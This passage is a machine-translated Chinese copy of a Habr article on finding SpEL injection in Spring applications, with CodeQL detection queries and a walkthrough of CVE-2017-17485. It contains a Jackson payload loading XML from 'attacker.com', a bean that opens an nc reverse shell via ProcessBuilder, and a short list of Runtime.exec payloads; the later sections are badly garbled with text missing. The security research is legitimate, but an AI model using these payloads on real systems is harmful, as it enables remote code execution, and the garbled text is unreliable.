class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">.getDoc()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getJavadoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> DocHasPath or </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">this</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getDeclaringType</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getDoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getJavadoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> DocHasPath ) } }</span></span></code> </pre> <br><p> 然后，为了结合Javadoc的类，方法和过滤器，用于选择的查询将采用以下形式： </p><br><pre> <code class="sql hljs">from ParseExpression expr, CallHasPath c where (expr.getQualifier().getType().(RefType).getASupertype*() instanceof ExpressionParser and c = expr.getEnclosingCallable()) <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> expr, c</code> </pre> <br><p> 该示例可以被认为是简单的，并且通常对于搜索特定漏洞是多余的。 更有趣的是在编写修订时搜索错误，因为 在其中，您需要指定负责检查的类本身，始终调用该类的方法以及在检查之前执行的方法。 </p><br><p> 始终调用verifyPath的方法的调用： </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">VerifyPathCallerAccess</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ VerifyPathCallerAccess() { exists(VerifyPathActionConf conf | conf.callAlwaysPerformsAction(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>) ) or <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() <span class="hljs-keyword"><span class="hljs-keyword">instanceof</span></span> VerifyPath } }</code> </pre> <br><p> 调用在verifyPath之前执行的方法： </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">UnsafeEvaluateCall</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ UnsafeEvaluateCall() { ( <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> Evaluate or </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">exists</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(UnsafeEvaluateCall unsafe | </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">.getMethod()</span></span></span><span class="hljs-function"> </span></span>= unsafe.getEnclosingCallable() ) ) <span class="hljs-function"><span class="hljs-function">and not </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">exists</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(VerifyPathCallerAccess verify | dominates(verify, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function"> ) } }</span></span></code> </pre> <br><p> 考虑另一个有趣的漏洞。 她的理解非常重要，因为 它表明该错误可能出在第三方库中，并演示了如何使用XML注释的bean。 </p><br><h2 id="jackson-and-bean"> 杰克逊和豆 </h2><br><p>  CVE-2017-17485基于FileSystemXmlApplicationContext的使用-它是XML形式的独立应用程序上下文，可从文件系统或URL接收上下文定义文件。 </p><br><p> 根据文档，这允许您从文件加载Bean并重新加载应用程序上下文。 <br>  “ ...创建一个新的FileSystemXmlApplicationContext，从给定的XML文件中加载定义，并自动刷新上下文” </p><br><p>  Jackson是一个库，可让您序列化和反序列化除黑名单之外的任何对象。 攻击者经常利用此机会。 对于此漏洞，攻击者必须向<code>org.springframework.context.support.FileSystemXmlApplicationContext</code>对象传递一个值，该值包含攻击者控制的文件的路径。 </p><br><p> 即 在请求正文中，您可以传递以下JSON： </p><br><pre> <code class="json hljs">{<span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-attr"><span class="hljs-attr">"obj"</span></span>: [<span class="hljs-string"><span class="hljs-string">"org.springframework.context.support.FileSystemXmlApplicationContext"</span></span>, <span class="hljs-string"><span class="hljs-string">"https://attacker.com/spel.xml"</span></span>]}</code> </pre> <br><p>  Spel.xml将包含bin参数： </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">beans</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.springframework.org/schema/beans"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"pb"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"java.lang.ProcessBuilder"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">constructor-arg</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">list</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value-type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"java.lang.String"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>nc<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>XXXX<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>9999<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>-e<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>/bin/sh<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">list</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">constructor-arg</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"whatever"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{pb.start()}"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">beans</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p> 因为 由于我们使用了具有start方法的java.lang.ProcessBuilder类，因此在重新加载上下文之后，Spring会从SpEL属性读取启动ProcessBuilder的表达式，从而迫使服务器使用nc连接到我们。 </p><br><p> 值得关注作为示例的spel.xml，因为 它显示了运行命令时如何传递参数。 </p><br><p> 还有什么其他方式可以加载bean或重新加载上下文？ </p><br><p> 即使快速浏览Spring文档，您仍然可以找到更多对我们有用的类。 </p><br><p>  ClassPathXmlApplicationContext和AbstractXmlApplicationContext与FileSystem相似，但是分别使用ClassPath和XML注释的Bean作为配置的路径。 </p><br><p> 与重新加载上下文有关的另一个有趣点是@RefreshScope。 </p><br><p> 任何带有@RefreshScope注释的Spring Bean将在启动时更新。 下次调用该方法时，所有使用它的组件都将收到一个新对象，它们将完全初始化并视情况引入。 </p><br><p>  RefreshScope是上下文中的一个组件，它具有一个公共的refreshAll方法，该方法旨在通过清除目标缓存来更新区域中的所有组件。 因此，在使用@RefreshScope的情况下，用户可以引用以/刷新结尾的URL，从而重新加载带注释的bean。 </p><br><h2 id="drugie-utility"> 其他实用程序 </h2><br><p> 还有许多其他插件和程序，可让您分析代码并查找漏洞。 </p><br><ul><li>  Jprofiler-作为独立的应用程序安装-IDE的服务器和插件。 允许您分析正在运行的应用程序。 通过图形分析对象的行为非常方便。 </li></ul><br><p><img src="https://habrastorage.org/webt/g4/ki/ij/g4kiijoeylzhjo742es00a_ksti.png"></p><br><p> 负数-已付款，但有10天的免费期限。 它不仅是从安全的角度来看，被认为是分析应用程序行为的最佳工具之一。 </p><br><ul><li>  Xrebel-付费，我们没有找到试用期的可能性。 但也被认为是最好的之一。 </li><li>  Coverity-使用其自己的服务器进行分析，因此仅对那些不怕布置其代码的人而言非常方便。 </li><li>  Checkmarx-非常有名，有偿，会多种语言，会丢弃很多误报。 但是，最好指出理论可能有错误的地方，而不是错过一个真正的错误。 </li><li>  OWASP依赖性检查-作为各种构建器的便捷插件提供。 分析Java应用程序时，我们设法对其进行了Maven和Ant的测试。 还支持.Net。 根据工作结果，它提供了一个方便的报告，指出了过时的库和已知的漏洞。 </li><li>  Findbugs-前面已经提到过。 它有许多实现，但是findbugs_cli选项被证明是最方便的，并且由于某种原因会显示更多问题。 可以如下使用： <br><pre> <code class="bash hljs">findsecbugs.bat -progress -html -output report_name.htm <span class="hljs-string"><span class="hljs-string">"path\example.jar"</span></span></code> </pre> </li><li>  LGTM QL-先前已经给出了其用法示例。 我们要单独说一句，还有一个付费用例，在此之后，您将收到用于分析代码的本地服务器。 <br> QL    Java,             . </li></ul><br><h1 id="black-box"> Black Box </h1><br><p>  -,   . <br>  ,    : Spring,     SpEL, ,  SpEL API,   -,        . </p><br><p>         spring,      URL,    API.        /metrics  /beans —     Spring Boot Actuator     ,        . </p><br><p>  ,    . </p><br><p>    , SpEL      ,     ,    . </p><br><ul><li>  : <code>var[SpEL]=123</code> </li><li>  : <code>&amp;variable1=123&amp;SpEL=</code> </li><li> : org.springframework.cookie = <code>${}</code> </li><li>     .. </li></ul><br><h2 id="vot-nebolshaya-podborka-s-variantami-peylodov">      : </h2><br><pre> <code class="javascript hljs">${<span class="hljs-number"><span class="hljs-number">1</span></span>+<span class="hljs-number"><span class="hljs-number">3</span></span>} T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string"><span class="hljs-string">"nslookup !url!"</span></span>) #<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getClass().forName(<span class="hljs-string"><span class="hljs-string">'java.lang.Runtime'</span></span>).getRuntime().exec(<span class="hljs-string"><span class="hljs-string">'nslookup !url!'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> java.lang.ProcessBuilder({<span class="hljs-string"><span class="hljs-string">'nslookup !url!'</span></span>}).start() ${user.name}</code> </pre> <br><h1 id="ne-spelom-ediny">  SpEL  </h1><br><p>    SpEL    ,   ,     EL Injection.    : OGNL, MVEL, JBoss EL, JSP EL.   -        . </p><br><h1 id="v-kachestve-zaklyucheniya">    </h1><br><p>  ZeroNights  : “ ,  Spring,   SpEL injection?” </p><br><p>   ,    CVE,   .       ,     ,   github. </p><br><p>  ,   ,            SpEL Expression. 即  (,   )        ,      . </p><br><p> 即            .      ,          ,       “” . </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN433034/">https://habr.com/ru/post/zh-CN433034/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN433014/index.html">关于最近释放宇航员进入外太空的笑话</a></li>
<li><a href="../zh-CN433016/index.html">界面更改，分层动画和结构化视觉混乱：2019年Web趋势回顾</a></li>
<li><a href="../zh-CN433018/index.html">UDB。 这是什么 第2部分。数据路径</a></li>
<li><a href="../zh-CN433030/index.html">现场直播：前端性能</a></li>
<li><a href="../zh-CN433032/index.html">医疗路由的工作方式-我们以DOC +应用程序为例</a></li>
<li><a href="../zh-CN433036/index.html">在小型企业中组织IT的技巧</a></li>
<li><a href="../zh-CN433038/index.html">营销人员为什么要学习编程</a></li>
<li><a href="../zh-CN433042/index.html">英特尔将于2019年发布具有三维架构Foveros的处理器</a></li>
<li><a href="../zh-CN433044/index.html">OpenJDK源代码包含太多脏话</a></li>
<li><a href="../zh-CN433046/index.html">关于RTOS的全部真相。 第25条。 数据通道：简介和基本服务</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>